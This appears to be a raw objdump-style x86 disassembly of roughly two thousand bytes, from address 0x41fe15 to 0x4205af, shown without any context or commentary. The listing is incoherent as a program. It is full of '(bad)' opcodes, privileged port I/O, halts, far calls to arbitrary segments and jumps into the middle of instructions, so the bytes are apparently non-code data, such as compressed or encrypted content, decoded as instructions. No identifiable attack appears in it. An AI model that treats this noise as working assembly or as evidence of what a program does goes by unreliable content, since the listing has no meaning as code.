  41fe15:	jecxz  0x41fdd4
  41fe17:	bound  esi,QWORD PTR [ebx-0x616b13e3]
  41fe1d:	jecxz  0x41fe48
  41fe1f:	cld    
  41fe20:	pusha  
  41fe21:	(bad)  
  41fe22:	push   ebp
  41fe23:	pop    ss
  41fe24:	lahf   
  41fe25:	jb     0x41fe95
  41fe27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe28:	in     al,dx
  41fe29:	div    BYTE PTR [edi-0x3e]
  41fe2c:	inc    edx
  41fe2d:	ins    BYTE PTR es:[edi],dx
  41fe2e:	xor    ah,bh
  41fe30:	stos   DWORD PTR es:[edi],eax
  41fe31:	lds    ebx,FWORD PTR [ebx]
  41fe33:	inc    ecx
  41fe34:	test   eax,0x855663ef
  41fe39:	sub    bl,bh
  41fe3b:	ret    
  41fe3c:	sti    
  41fe3d:	hlt    
  41fe3e:	out    0xcc,al
  41fe40:	call   0x500d:0x123bc71d
  41fe47:	push   edx
  41fe48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe49:	pop    ds
  41fe4a:	jl     0x41fe03
  41fe4c:	cmp    bh,BYTE PTR [edi+esi*8+0x64a2b65e]
  41fe53:	xchg   edi,eax
  41fe54:	fdivr  st(3),st
  41fe56:	and    BYTE PTR [ecx],ch
  41fe58:	mov    ah,0xef
  41fe5a:	int3   
  41fe5b:	sbb    eax,DWORD PTR [ebp+0x6a]
  41fe5e:	mov    edi,0x656f618f
  41fe63:	(bad)
  41fe67:	nop
  41fe68:	adc    ecx,esp
  41fe6a:	pusha  
  41fe6b:	mov    eax,ds:0x4a3e7969
  41fe70:	mov    ebx,0x254ace40
  41fe75:	sbb    DWORD PTR [eax-0x2a89084],eax
  41fe7b:	xlat   BYTE PTR ds:[ebx]
  41fe7c:	test   cl,bh
  41fe7e:	(bad)  
  41fe7f:	fnstcw WORD PTR [edi]
  41fe81:	pop    ds
  41fe82:	dec    edi
  41fe83:	sub    BYTE PTR [ebx-0x42],bl
  41fe86:	push   ebp
  41fe87:	mov    dh,0x52
  41fe89:	inc    edi
  41fe8a:	lea    esi,[esi-0x74]
  41fe8d:	xchg   ebp,eax
  41fe8e:	test   DWORD PTR es:0x5eac6a33,0x50a3af55
  41fe99:	sbb    BYTE PTR [esp+ebp*8+0x44],bl
  41fe9d:	pop    esp
  41fe9e:	fimul  DWORD PTR [edi]
  41fea0:	fwait
  41fea1:	jb     0x41fe2d
  41fea3:	clc    
  41fea4:	inc    esi
  41fea5:	inc    ecx
  41fea6:	pop    ss
  41fea7:	sbb    esp,eax
  41fea9:	jecxz  0x41fe42
  41feab:	and    esp,ebx
  41fead:	pop    edx
  41feae:	push   0xa9fd5c2c
  41feb3:	nop
  41feb4:	outs   dx,DWORD PTR ds:[esi]
  41feb5:	data16 jp 0x41feac
  41feb8:	call   0x5f816d44
  41febd:	or     ch,BYTE PTR [ecx+0x2ad977a]
  41fec3:	repnz repz adc DWORD PTR [edx-0x1c],edx
  41fec8:	sbb    edx,DWORD PTR [ebx]
  41feca:	test   BYTE PTR [eax-0x25],bh
  41fecd:	imul   DWORD PTR [ecx+0x4]
  41fed0:	and    ch,BYTE PTR [esi+0x4accc510]
  41fed6:	fdivr  DWORD PTR [edi+0x5f]
  41fed9:	push   0xab277feb
  41fede:	pop    eax
  41fedf:	pop    ebx
  41fee0:	es das 
  41fee2:	xchg   BYTE PTR [edx+0x20],al
  41fee5:	mov    bh,0x2e
  41fee7:	popa   
  41fee8:	pop    eax
  41fee9:	pop    esi
  41feea:	mov    ebp,ebp
  41feec:	lahf   
  41feed:	sbb    ebp,DWORD PTR [ebx+0x37]
  41fef0:	add    DWORD PTR [ebx],0x1abede6e
  41fef6:	cli    
  41fef7:	clc    
  41fef8:	bound  edx,QWORD PTR [ebx+0x59]
  41fefb:	xor    dl,bh
  41fefd:	cmp    BYTE PTR [edi-0xf],ch
  41ff00:	mov    esi,0xc5bdc5ef
  41ff05:	jb     0x41ff43
  41ff07:	inc    edi
  41ff08:	jnp    0x41ff6c
  41ff0a:	ja     0x41ff82
  41ff0c:	ss mov ah,0xeb
  41ff0f:	scas   eax,DWORD PTR es:[edi]
  41ff10:	fwait
  41ff11:	jns    0x41ff68
  41ff13:	and    DWORD PTR [edx-0x6be5fd47],edx
  41ff19:	stos   BYTE PTR es:[edi],al
  41ff1a:	sbb    bh,bl
  41ff1c:	sub    BYTE PTR [ecx],cl
  41ff1e:	fsubr  DWORD PTR [edi+ebx*8-0x102476]
  41ff25:	xchg   esi,eax
  41ff26:	adc    eax,0x52f40d3b
  41ff2b:	lock xchg esp,eax
  41ff2d:	sub    al,BYTE PTR [edi+0x75]
  41ff30:	lahf   
  41ff31:	in     eax,dx
  41ff32:	add    DWORD PTR [ebp-0x7479fbb2],edx
  41ff38:	inc    ebx
  41ff39:	pop    ebp
  41ff3a:	jnp    0x41ff91
  41ff3c:	popf   
  41ff3d:	sub    DWORD PTR [eax+0x6baf9b7d],edx
  41ff43:	inc    eax
  41ff44:	push   ebp
  41ff45:	bnd jl 0x41ff33
  41ff48:	test   edi,esi
  41ff4a:	leave  
  41ff4b:	pop    ds
  41ff4c:	iret   
  41ff4d:	xor    eax,0x75565654
  41ff52:	mov    ch,0x61
  41ff54:	mov    ds:0x720df97b,al
  41ff59:	xor    ebp,esi
  41ff5b:	mov    bl,BYTE PTR [ebx]
  41ff5d:	lahf   
  41ff5e:	mov    edx,0xc62077ba
  41ff63:	mov    esp,eax
  41ff65:	sub    al,0x59
  41ff67:	push   0xc5fd7c2f
  41ff6c:	adc    DWORD PTR [ebx+0x34c4c7fc],ebp
  41ff72:	cmovbe edx,DWORD PTR [eax+0x71dbcb8e]
  41ff79:	outs   dx,DWORD PTR ds:[esi]
  41ff7a:	sub    al,0x1
  41ff7c:	adc    eax,0x6a111c89
  41ff81:	push   ecx
  41ff82:	jbe    0x41ffc8
  41ff84:	jp     0x41ffb5
  41ff86:	push   es
  41ff87:	inc    esp
  41ff88:	test   DWORD PTR [edi-0x267b9c08],esi
  41ff8e:	cmc    
  41ff8f:	(bad)  [edx-0x4a]
  41ff92:	sbb    ah,BYTE PTR [eax+0x31]
  41ff95:	lods   eax,DWORD PTR fs:[esi]
  41ff97:	(bad)  
  41ff98:	xor    dh,BYTE PTR [esi-0x1e]
  41ff9b:	sub    dl,BYTE PTR [ebx+esi*8]
  41ff9e:	xchg   esi,eax
  41ff9f:	lds    ebx,FWORD PTR [ecx+0x7bbe82f0]
  41ffa5:	pop    eax
  41ffa6:	sub    eax,0x4c82e4df
  41ffab:	aas    
  41ffac:	xor    DWORD PTR [ebp+edx*1+0x480207bb],eax
  41ffb3:	addr16 cmp eax,0x1ca67e1b
  41ffb9:	mov    dh,0x65
  41ffbb:	int3   
  41ffbc:	jl     0x41ff7d
  41ffbe:	in     al,dx
  41ffbf:	call   0xcef4:0x18fb06c2
  41ffc6:	test   ebp,0xc49c542e
  41ffcc:	outs   dx,BYTE PTR ds:[esi]
  41ffcd:	std    
  41ffce:	mov    bh,BYTE PTR [eax]
  41ffd0:	cwde   
  41ffd1:	or     BYTE PTR [ecx-0x465ad1aa],dl
  41ffd7:	push   ss
  41ffd8:	dec    eax
  41ffd9:	xor    al,0x22
  41ffdb:	or     DWORD PTR [edx+0x3133ff4e],ebp
  41ffe1:	inc    eax
  41ffe2:	(bad)  
  41ffe3:	loopne 0x420017
  41ffe5:	adc    ecx,esp
  41ffe7:	push   ebp
  41ffe8:	cs pop ss
  41ffea:	stos   BYTE PTR es:[edi],al
  41ffeb:	mov    cl,0x51
  41ffed:	lea    edi,[esi+0x40b0e260]
  41fff3:	add    al,0x77
  41fff5:	mov    es,WORD PTR [eax]
  41fff7:	not    BYTE PTR [edi]
  41fff9:	adc    BYTE PTR [ecx-0x33bd9044],ah
  41ffff:	inc    ebp
  420000:	mov    ds:0x447f01ba,al
  420005:	ds iret 
  420007:	aad    0x92
  420009:	lock mov esi,DWORD PTR [eax]
  42000c:	in     eax,0x2f
  42000e:	sahf   
  42000f:	pop    ebx
  420010:	pop    es
  420011:	mov    al,ds:0x28338512
  420016:	inc    ebp
  420017:	jno    0x42005e
  420019:	stos   BYTE PTR es:[edi],al
  42001a:	icebp  
  42001b:	pop    ebx
  42001c:	std    
  42001d:	imul   edi,DWORD PTR [ecx-0x6367feba],0xd943eacb
  420027:	rol    BYTE PTR [ebp-0x3d],cl
  42002a:	xor    ebx,ebx
  42002c:	jge    0x42003b
  42002e:	inc    esi
  42002f:	xchg   esp,ebp
  420031:	(bad)  
  420032:	(bad)  
  420033:	ror    DWORD PTR [eax-0x35e1d219],1
  420039:	test   al,0x69
  42003b:	loopne 0x420080
  42003d:	sub    eax,0x80f60725
  420042:	dec    esi
  420043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420044:	cdq    
  420045:	lea    esp,[esi-0x70]
  420048:	sub    bl,dh
  42004a:	lock inc ebx
  42004c:	xlat   BYTE PTR ds:[ebx]
  42004d:	push   edx
  42004e:	xchg   edx,eax
  42004f:	dec    edi
  420050:	pushf  
  420051:	fcmovnu st,st(5)
  420053:	jnp    0x420098
  420055:	xor    eax,0xa2b5cd34
  42005a:	inc    esp
  42005b:	stos   DWORD PTR es:[edi],eax
  42005c:	aam    0x5c
  42005e:	adc    BYTE PTR [ebx],bh
  420060:	lahf   
  420061:	in     eax,0xfe
  420063:	add    ebx,DWORD PTR [ebp-0xc296e0e]
  420069:	and    cl,dh
  42006b:	stos   DWORD PTR es:[edi],eax
  42006c:	fsubp  st(5),st
  42006e:	daa    
  42006f:	inc    edi
  420070:	out    dx,eax
  420071:	rcl    bl,0x6a
  420074:	dec    ecx
  420075:	ins    DWORD PTR es:[edi],dx
  420076:	jbe    0x420059
  420078:	outs   dx,DWORD PTR ds:[esi]
  420079:	sub    al,0xc7
  42007b:	mov    ds:0xa1a07bbf,al
  420080:	or     eax,0xc455926
  420085:	aad    0x86
  420087:	push   esi
  420088:	sub    ch,ah
  42008a:	loop   0x420029
  42008c:	and    ecx,ecx
  42008e:	fcomip st,st(2)
  420090:	push   ss
  420091:	cmp    bh,al
  420093:	inc    ebx
  420094:	sub    BYTE PTR [ecx-0x5e60a2e6],dh
  42009a:	loop   0x420098
  42009c:	xor    al,0x9d
  42009e:	mov    edi,0xa630ffc1
  4200a3:	adc    dh,BYTE PTR [ecx]
  4200a5:	adc    esi,DWORD PTR [edx+ebx*4-0x459caf8c]
  4200ac:	xchg   ebp,eax
  4200ad:	push   ebx
  4200ae:	sbb    BYTE PTR [esi],bl
  4200b0:	push   ecx
  4200b1:	xchg   ebx,eax
  4200b2:	loopne 0x42004e
  4200b4:	mov    al,0x10
  4200b6:	inc    eax
  4200b7:	call   0xc0727ea
  4200bc:	(bad)  
  4200bd:	pop    esp
  4200be:	sbb    BYTE PTR [edx],bh
  4200c0:	pop    ebx
  4200c1:	cmp    ebp,0xd94f452e
  4200c7:	cld    
  4200c8:	lods   eax,DWORD PTR ds:[esi]
  4200c9:	scas   eax,DWORD PTR es:[edi]
  4200ca:	out    dx,al
  4200cb:	push   esi
  4200cc:	push   edi
  4200cd:	or     DWORD PTR [ebx-0x47],edi
  4200d0:	js     0x420128
  4200d2:	(bad)  
  4200d3:	xchg   ebp,eax
  4200d4:	cmp    al,0xc9
  4200d6:	inc    edi
  4200d7:	fstp   st(2)
  4200d9:	call   FWORD PTR [esi]
  4200db:	in     al,dx
  4200dc:	je     0x4200d8
  4200de:	repnz sbb eax,0x4c44dbde
  4200e4:	ror    DWORD PTR [eax],0x4d
  4200e7:	adc    BYTE PTR [ebp-0x10],cl
  4200ea:	(bad)  
  4200ec:	aad    0xf9
  4200ee:	push   cs
  4200ef:	addr16 (bad) 
  4200f1:	mov    ah,0x93
  4200f3:	adc    al,0x38
  4200f5:	lods   al,BYTE PTR ds:[esi]
  4200f6:	lds    esi,FWORD PTR [esi+0x19b5b483]
  4200fc:	add    DWORD PTR [ecx+ebp*1-0x783c5898],edx
  420103:	test   DWORD PTR [edx-0x41],ebp
  420106:	mov    esp,0x95ef3d39
  42010b:	inc    edx
  42010c:	adc    DWORD PTR [ecx+esi*1-0x66],ecx
  420110:	sub    BYTE PTR [esi+ebp*1+0x482a380d],0x8a
  420118:	pop    esp
  420119:	fld    QWORD PTR [edi]
  42011b:	push   0x184de5e9
  420120:	mov    esp,DWORD PTR [ecx]
  420122:	mov    ah,0xb7
  420124:	push   esi
  420125:	sub    ebx,DWORD PTR [bp+si+0x74]
  420129:	and    DWORD PTR [edi-0x7e1f411],0x7a2ae490
  420133:	sbb    eax,DWORD PTR ds:0x49691c79
  420139:	outs   dx,DWORD PTR gs:[esi]
  42013b:	add    ebp,DWORD PTR [esi+ebx*8-0x5600284e]
  420142:	xor    DWORD PTR [ecx],edx
  420144:	jge    0x420129
  420146:	push   esp
  420147:	or     al,0x52
  420149:	jg     0x42014f
  42014b:	and    DWORD PTR [edx],ecx
  42014d:	std    
  42014e:	retf   
  42014f:	mov    eax,0x235dd70d
  420154:	outs   dx,DWORD PTR ds:[esi]
  420155:	fld    DWORD PTR [edx]
  420157:	push   ebp
  420158:	test   eax,0xdef85507
  42015d:	xchg   ebx,eax
  42015e:	or     ebx,ebx
  420160:	mov    esp,0xfafcba0b
  420165:	loopne 0x4201aa
  420167:	ss nop
  420169:	mov    al,BYTE PTR [edi+0x64]
  42016c:	or     eax,0xa3f82842
  420171:	out    0x25,eax
  420173:	xchg   ecx,eax
  420174:	test   eax,0xe37444f7
  420179:	ins    DWORD PTR es:[edi],dx
  42017a:	addr16 popf 
  42017c:	ds jecxz 0x4201d3
  42017f:	mov    bh,0xaa
  420181:	les    esi,FWORD PTR [edx+0x13]
  420184:	cmp    bl,al
  420186:	(bad)  
  420187:	jmp    0x4201c8
  420189:	push   ebx
  42018a:	push   cs
  42018b:	rcl    BYTE PTR [ebx],0x98
  42018e:	mov    dl,0x10
  420190:	stos   BYTE PTR es:[edi],al
  420191:	outs   dx,BYTE PTR ds:[esi]
  420192:	mov    ebx,0x1d85f1e7
  420197:	or     eax,0xea35c4e6
  42019c:	(bad)  
  42019d:	sub    cl,BYTE PTR [ecx+0x5be9cfac]
  4201a3:	inc    esi
  4201a4:	inc    edx
  4201a5:	push   esp
  4201a6:	adc    DWORD PTR ds:0x4143e03f,esp
  4201ac:	loop   0x4201f1
  4201ae:	lea    eax,[esi-0x72]
  4201b1:	push   eax
  4201b2:	dec    esi
  4201b3:	pop    ebp
  4201b4:	nop
  4201b5:	mov    bh,0xe4
  4201b7:	cmp    al,0xf6
  4201ba:	cli    
  4201bb:	int    0xdf
  4201bd:	and    ah,bl
  4201bf:	aaa    
  4201c0:	push   esp
  4201c1:	add    esp,DWORD PTR [edx]
  4201c3:	test   al,0xd0
  4201c5:	fwait
  4201c6:	or     BYTE PTR [edx+0x5a854884],dl
  4201cc:	inc    esi
  4201cd:	int    0x5a
  4201cf:	test   al,0xd4
  4201d1:	(bad)  
  4201d2:	aad    0xc0
  4201d4:	adc    al,0x81
  4201d6:	xor    ebp,ecx
  4201d8:	les    edx,FWORD PTR [ebp-0x7ca9027]
  4201de:	pusha  
  4201df:	outs   dx,BYTE PTR ds:[esi]
  4201e0:	mov    ch,0x43
  4201e2:	aaa    
  4201e3:	leave  
  4201e4:	mov    bl,0xaf
  4201e6:	mov    ?,WORD PTR [edx]
  4201e8:	in     eax,0xfc
  4201ea:	int3   
  4201eb:	int3   
  4201ec:	repnz loopne 0x420234
  4201ef:	clc    
  4201f0:	mov    bl,0x5c
  4201f2:	stos   DWORD PTR es:[edi],eax
  4201f3:	shr    esi,cl
  4201f5:	and    al,0x6d
  4201f7:	shl    cl,0x20
  4201fa:	jno    0x420269
  4201fc:	je     0x4201b9
  4201fe:	inc    ebx
  4201ff:	das    
  420200:	inc    ecx
  420201:	(bad)  
  420202:	fstp   DWORD PTR [edi-0x4bdf4820]
  420208:	cdq    
  420209:	(bad)  
  42020a:	push   ecx
  42020b:	stos   BYTE PTR es:[edi],al
  42020c:	jge    0x420252
  42020e:	sbb    ebp,DWORD PTR [ebx-0x60]
  420211:	adc    eax,0x8807e764
  420216:	xchg   esi,eax
  420217:	xchg   dh,dl
  420219:	dec    ebp
  42021a:	stc    
  42021b:	pushw  cs
  42021d:	stc    
  42021e:	mov    ch,BYTE PTR [esi]
  420220:	push   edx
  420221:	(bad)  
  420222:	scas   al,BYTE PTR es:[edi]
  420223:	hlt    
  420224:	fwait
  420225:	mov    edi,0x839c9ae0
  42022a:	mov    eax,0x8ede1df8
  42022f:	icebp  
  420230:	xor    DWORD PTR [edi-0x57fe74f4],edi
  420236:	retf   
  420237:	sub    al,0xa8
  420239:	or     DWORD PTR [esi],ecx
  42023b:	dec    ebx
  42023c:	call   0xba776dfe
  420241:	jae    0x42028e
  420243:	test   BYTE PTR [edx],ch
  420245:	in     eax,dx
  420246:	test   bh,0xa0
  420249:	cmp    al,BYTE PTR gs:[eax+0x103d5f5b]
  420250:	mov    al,0x45
  420252:	dec    esp
  420253:	push   0x6c
  420255:	dec    esp
  420256:	lods   eax,DWORD PTR ds:[esi]
  420257:	out    0x3f,eax
  420259:	jp     0x42024e
  42025b:	retf   0x5efa
  42025e:	test   eax,0x4ef1eb60
  420263:	(bad)  
  420264:	rcr    DWORD PTR [edx],cl
  420266:	jb     0x42021f
  420268:	rcl    BYTE PTR [esi-0x71],1
  42026b:	add    bh,BYTE PTR [edi+ebp*1-0xd565547]
  420272:	aad    0xd4
  420274:	inc    ecx
  420275:	dec    esp
  420276:	xchg   ebp,eax
  420277:	pop    ss
  420278:	adc    dh,BYTE PTR [ecx]
  42027a:	je     0x42022d
  42027c:	mov    bh,0xdf
  42027e:	xchg   BYTE PTR [esi-0x2793cd62],bl
  420284:	data16 idiv BYTE PTR [esi+0x4e]
  420288:	sti    
  420289:	push   0xffffffb1
  42028b:	int3   
  42028c:	jae    0x42029b
  42028e:	ret    0x4ee7
  420291:	pop    ds
  420292:	pop    esp
  420293:	and    cl,BYTE PTR [edx-0xb]
  420296:	mov    eax,ds:0x43ce542
  42029b:	mov    al,ds:0x5e3ac6b2
  4202a0:	dec    edi
  4202a1:	or     eax,0xcd03759d
  4202a6:	xlat   BYTE PTR ds:[ebx]
  4202a7:	and    ah,BYTE PTR [esi+ecx*8]
  4202aa:	mov    edi,0x5244915f
  4202af:	pushf  
  4202b0:	fldenv [esi+0x4b57a480]
  4202b6:	cld    
  4202b7:	add    al,bl
  4202b9:	pop    ebx
  4202ba:	ror    BYTE PTR [ebx],0xae
  4202bd:	cmovae ebp,DWORD PTR [ecx-0x43a39455]
  4202c4:	in     al,dx
  4202c5:	xor    cl,BYTE PTR [ebp-0x51d40e82]
  4202cb:	mov    eax,0xf8c5a1d8
  4202d0:	cs mov dl,0x59
  4202d3:	mov    ebp,0x8b62adca
  4202d8:	mov    ecx,DWORD PTR [esi-0x3b]
  4202db:	ins    BYTE PTR es:[edi],dx
  4202dc:	cld    
  4202dd:	lods   eax,DWORD PTR ds:[esi]
  4202de:	xchg   ebx,eax
  4202df:	and    DWORD PTR [ebp-0x39ec8f9a],esp
  4202e5:	stc    
  4202e6:	mov    BYTE PTR [ebp-0x19],dl
  4202e9:	retf   
  4202ea:	mov    ah,0xf8
  4202ec:	frstor [ebx+0x33]
  4202ef:	cwde   
  4202f0:	imul   edi,DWORD PTR [ecx+0x41],0xafbb9513
  4202f7:	ins    BYTE PTR es:[edi],dx
  4202f8:	lahf   
  4202f9:	cli    
  4202fa:	add    al,0xd2
  4202fc:	dec    ecx
  4202fd:	xchg   DWORD PTR [edx-0x566a0660],ecx
  420303:	or     BYTE PTR [ebp+0x24f7dcde],0xba
  42030a:	xchg   ebx,eax
  42030b:	outs   dx,DWORD PTR ds:[esi]
  42030c:	xor    al,0x44
  42030e:	nop
  42030f:	xor    DWORD PTR [ebp-0x20],esi
  420312:	leave  
  420313:	or     cl,BYTE PTR [ebx-0x6a]
  420316:	xchg   eax,edx
  420318:	sbb    esp,DWORD PTR [edi-0x4f67fa42]
  42031e:	dec    ebx
  42031f:	lea    ebp,ds:[ecx+0x4c97a8f]
  420326:	mov    ecx,0xf3be5bad
  42032b:	jnp    0x4202ae
  42032d:	or     eax,0xb41d246d
  420332:	pop    esi
  420333:	mov    edi,0x9f8cb557
  420338:	sbb    BYTE PTR [ebx+0x1ae8ba99],dl
  42033e:	das    
  42033f:	aam    0x64
  420341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420342:	hlt    
  420343:	xchg   edi,eax
  420344:	jb     0x4202ef
  420346:	mov    ?,WORD PTR ss:[ecx+0x28]
  42034a:	mov    cl,0x7a
  42034c:	call   0x2d650f53
  420351:	cmp    dh,0x20
  420354:	cmp    esp,DWORD PTR [eax+esi*8-0x3b8b40ca]
  42035b:	mov    eax,ds:0xd55027b0
  420360:	clc    
  420361:	out    dx,al
  420362:	nop
  420363:	test   eax,0x4a4069b8
  420368:	pop    esi
  420369:	out    dx,eax
  42036a:	push   DWORD PTR [ebp+0x6]
  42036d:	not    eax
  42036f:	cmp    ebp,DWORD PTR [esi+0x6a4ff804]
  420375:	mov    eax,0xfabe23b8
  42037a:	out    0x85,eax
  42037c:	sbb    DWORD PTR [eax-0x2d0cc2e6],0xb43eef8f
  420386:	push   esi
  420387:	repnz out dx,eax
  420389:	mov    esi,0x94ad8ddb
  42038e:	adc    DWORD PTR [ebx-0x26d6d013],ebp
  420394:	retf   0xaff2
  420397:	dec    esi
  420398:	sti    
  420399:	push   eax
  42039a:	sbb    bh,BYTE PTR [esi-0x4c6d5a53]
  4203a0:	dec    ebp
  4203a1:	cmp    cl,BYTE PTR gs:[ebx-0x56]
  4203a5:	es inc eax
  4203a7:	xchg   edi,eax
  4203a8:	sahf   
  4203a9:	rcr    BYTE PTR [esi-0x6],cl
  4203ac:	fisub  WORD PTR [ebp-0x64983259]
  4203b2:	(bad)  
  4203b3:	out    dx,eax
  4203b4:	enter  0x38ea,0x53
  4203b8:	and    al,BYTE PTR [ebx-0x1]
  4203bb:	cwde   
  4203bc:	aaa    
  4203bd:	icebp  
  4203be:	jne    0x4203d1
  4203c0:	pushf  
  4203c1:	rcl    DWORD PTR [ebp-0x18],0x11
  4203c5:	data16 out dx,al
  4203c7:	add    bl,dh
  4203c9:	rol    edx,1
  4203cb:	pop    ecx
  4203cc:	gs jmp 0x4203c7
  4203cf:	in     eax,dx
  4203d0:	std    
  4203d1:	nop
  4203d2:	in     eax,dx
  4203d3:	pop    ebx
  4203d4:	stos   DWORD PTR es:[edi],eax
  4203d5:	in     al,dx
  4203d6:	push   cs
  4203d7:	iret   
  4203d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203d9:	jg     0x4203a5
  4203db:	outs   dx,DWORD PTR ds:[esi]
  4203dc:	loopne 0x420430
  4203de:	mov    edx,?
  4203e0:	dec    esp
  4203e1:	lock inc edi
  4203e3:	pop    eax
  4203e4:	outs   dx,BYTE PTR ds:[esi]
  4203e5:	cmc    
  4203e6:	jecxz  0x42036c
  4203e8:	jecxz  0x4203b0
  4203ea:	test   BYTE PTR [ecx-0x4f],dl
  4203ed:	mov    edx,0x9bfebc98
  4203f2:	(bad)  
  4203f3:	adc    eax,0x3bf66267
  4203f8:	or     BYTE PTR [eax-0x5b],cl
  4203fb:	clc    
  4203fc:	ret    0xf175
  4203ff:	push   0x3d
  420401:	dec    edx
  420402:	jae    0x42042e
  420404:	scas   eax,DWORD PTR es:[edi]
  420405:	dec    esp
  420406:	mov    dh,bh
  420408:	lods   eax,DWORD PTR ds:[esi]
  420409:	jbe    0x4203d2
  42040b:	cmp    eax,0x67373866
  420410:	pusha  
  420411:	cmp    eax,0x72a60f83
  420416:	or     cl,BYTE PTR [esi]
  420418:	pop    esi
  420419:	not    DWORD PTR [ebx-0x27]
  42041c:	dec    eax
  42041d:	leave  
  42041e:	in     al,0x5c
  420420:	iret   
  420421:	adc    BYTE PTR [ebp-0x2ec67d40],0x8f
  420428:	jp     0x4203fa
  42042a:	jp     0x4203e6
  42042c:	stos   DWORD PTR es:[edi],eax
  42042d:	xchg   esp,eax
  42042e:	jle    0x420404
  420430:	push   ds
  420431:	adc    eax,0x1c8c60ce
  420436:	call   0x6042af21
  42043b:	and    DWORD PTR [bp-0x1948],esi
  420440:	fs loope 0x4204ac
  420443:	xchg   ebp,eax
  420444:	mov    esi,0xc57ae08f
  420449:	pop    ecx
  42044a:	nop
  42044b:	pushf  
  42044c:	xchg   esi,eax
  42044d:	mov    dh,0x95
  42044f:	mov    esp,0x308972b8
  420454:	stos   DWORD PTR es:[edi],eax
  420455:	loop   0x420415
  420457:	repz test eax,0x680a9e97
  42045d:	in     al,dx
  42045e:	loope  0x4204d5
  420460:	jbe    0x42040e
  420462:	adc    al,BYTE PTR [edi+0x5a057e21]
  420468:	sub    eax,0x2033bff0
  42046d:	stos   BYTE PTR es:[edi],al
  42046e:	ja     0x42047f
  420470:	pop    eax
  420471:	sub    dl,ah
  420473:	add    esp,esi
  420475:	repz pop ebx
  420477:	ins    BYTE PTR es:[edi],dx
  420478:	mov    al,ds:0xdb989ff4
  42047d:	mov    ch,0xef
  42047f:	mov    eax,0x1431fed
  420484:	iret   
  420485:	in     al,0xab
  420487:	jb     0x420506
  420489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42048a:	xchg   bp,ax
  42048c:	xor    DWORD PTR [ecx],edi
  42048e:	mov    al,ds:0x7a38b54b
  420493:	int3   
  420494:	es (bad) 
  420496:	fcmovnbe st,st(5)
  420498:	pop    eax
  420499:	rcr    edx,1
  42049b:	not    BYTE PTR [ebx-0x31f2f92b]
  4204a1:	mov    BYTE PTR [ebx],bh
  4204a3:	enter  0x758e,0xb6
  4204a7:	jno    0x4204b8
  4204a9:	push   0xffffffef
  4204ab:	outs   dx,BYTE PTR ds:[esi]
  4204ac:	stc    
  4204ad:	rcr    DWORD PTR [esp+ebx*8-0x62],1
  4204b1:	test   DWORD PTR [ebp+0x63],ecx
  4204b4:	cmp    esp,ebp
  4204b6:	sub    edx,DWORD PTR [ecx]
  4204b8:	shl    BYTE PTR [edi-0x420d7276],0x63
  4204bf:	fstp   QWORD PTR [edx]
  4204c1:	sbb    al,0x1b
  4204c3:	dec    edi
  4204c5:	dec    ax
  4204c7:	arpl   WORD PTR [ebx+0x2f0e3e1d],sp
  4204cd:	test   eax,0x36a6c13c
  4204d2:	mov    al,ds:0x6bc320ea
  4204d7:	mov    dh,0xc
  4204d9:	out    0xe,eax
  4204db:	mov    edi,0xa8608531
  4204e0:	je     0x4204c4
  4204e2:	arpl   WORD PTR [eax+0x44],di
  4204e5:	and    ch,BYTE PTR ds:0x762c04ee
  4204eb:	xor    al,0x2c
  4204ed:	xlat   BYTE PTR ds:[ebx]
  4204ee:	jbe    0x420541
  4204f0:	jns    0x420492
  4204f2:	imul   ebp,esp,0x83310db6
  4204f8:	inc    esi
  4204f9:	lock clc 
  4204fb:	mov    eax,0x39a4c8f6
  420500:	out    dx,al
  420501:	inc    edi
  420502:	xchg   esp,eax
  420503:	inc    esi
  420504:	xchg   ebp,eax
  420505:	xor    eax,esp
  420507:	(bad)  
  420508:	aam    0xb3
  42050a:	daa    
  42050b:	push   esi
  42050c:	cmp    al,0x48
  42050e:	cs rdpmc 
  420511:	sar    BYTE PTR [edx+0x4aa91d10],cl
  420517:	add    bl,BYTE PTR [edi]
  420519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42051a:	mov    ebx,0x28b297f7
  42051f:	xchg   edi,eax
  420520:	xor    eax,0x6e43a8ed
  420525:	retf   
  420526:	fst    QWORD PTR [edi]
  420528:	xor    BYTE PTR [edx],bl
  42052a:	dec    edx
  42052b:	inc    ebx
  42052c:	clc    
  42052d:	cmp    edi,0xffffffa4
  420530:	sub    ebx,DWORD PTR ds:0xd6cb72f
  420536:	xor    bh,BYTE PTR [ebp+0x65]
  420539:	shl    DWORD PTR [eax-0x67],1
  42053c:	adc    BYTE PTR [edi-0xb],dh
  42053f:	stos   BYTE PTR es:[edi],al
  420540:	dec    esi
  420541:	pop    eax
  420542:	push   ss
  420543:	adc    eax,0x4e34233b
  420548:	outs   dx,DWORD PTR ds:[esi]
  420549:	pusha  
  42054a:	mov    ecx,0xde56537
  42054f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420550:	push   edx
  420551:	add    ch,BYTE PTR [eax+0x20ae2ca2]
  420557:	pop    es
  420558:	in     eax,0xbd
  42055a:	sbb    ebp,esp
  42055c:	in     eax,dx
  42055d:	pop    edx
  42055e:	cmp    DWORD PTR [ecx+edx*8],edx
  420561:	jne    0x4205cf
  420563:	shl    DWORD PTR [ebp+0x22c85b64],cl
  420569:	push   0x6c95686c
  42056e:	loope  0x420559
  420570:	es iret 
  420572:	jns    0x420588
  420574:	psrlw  mm5,mm7
  420577:	mov    ecx,0x1da16c67
  42057c:	inc    eax
  42057d:	dec    edi
  42057e:	outs   dx,DWORD PTR ds:[esi]
  42057f:	xchg   BYTE PTR [edi+0x1d],al
  420582:	aam    0xc1
  420584:	cmp    BYTE PTR [edi+edx*1+0x43],dl
  420588:	dec    ebx
  420589:	ret    
  42058a:	int3   
  42058b:	gs setge bl
  42058f:	sbb    bh,ch
  420591:	sub    DWORD PTR [ecx+0x61496244],ebp
  420597:	add    DWORD PTR [ebx+0x1],0x613c19c8
  42059e:	xor    BYTE PTR [edx+ebp*4-0x31],ch
  4205a2:	jbe    0x4205cf
  4205a4:	loop   0x42057e
  4205a6:	test   al,0xf8
  4205a8:	aad    0x7f
  4205aa:	mov    ecx,0x7c13f242
  4205af:	dec    edx
